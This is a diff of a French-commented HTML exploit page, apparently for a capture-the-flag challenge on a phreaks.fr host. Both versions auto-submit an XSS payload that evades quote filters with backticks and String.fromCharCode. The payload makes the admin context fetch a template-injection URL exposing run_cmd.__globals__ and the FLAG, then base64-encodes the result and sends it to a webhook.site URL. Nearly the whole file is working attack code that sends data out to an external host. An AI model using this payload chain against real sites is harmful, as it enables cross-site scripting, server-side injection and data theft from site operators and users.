@@ -1,23 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS Exploit</title></head>
+<head><title>XSS Attack</title></head>
 <body>
-<h1>Exploitation en cours...</h1>
+<h2>Exploitation...</h2>
 
 <script>
-// Créer un formulaire dynamique pour exploiter la faille XSS via l'attribut onfocus
-// L'astuce est d'utiliser des backticks pour éviter les quotes et String.fromCharCode pour le deux-points
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = 'https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name';
-
-const input = document.createElement('input');
-input.name = 'name';
-input.value = 'x`;fetch(`/admin?prompt={run_cmd.__globals__}`).then(r=>r.text()).then(t=>fetch(`https${String.fromCharCode(58)}//webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?d=`+btoa(t)));//';
-
-form.appendChild(input);
-document.body.appendChild(form);
-form.submit();
+  // Version améliorée du payload utilisant backticks et String.fromCharCode
+  const xssPayload = 'x`;fetch(`/admin?prompt={run_cmd.__globals__[FLAG]}`).then(r=>r.text()).then(d=>fetch(`https${String.fromCharCode(58)}//webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?d=${btoa(d)}`));//';
+  
+  fetch('https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'name=' + encodeURIComponent(xssPayload)
+  })
+  .then(response => {
+    console.log("Payload envoyé!");
+    // Indiquer au bot que nous avons terminé
+    document.body.innerHTML = "<h2>Exploitation terminée!</h2>";
+  })
+  .catch(error => {
+    console.error("Erreur:", error);
+    document.body.innerHTML = "<h2>Erreur d'exploitation: " + error + "</h2>";
+  });
 </script>
 </body>
 </html>
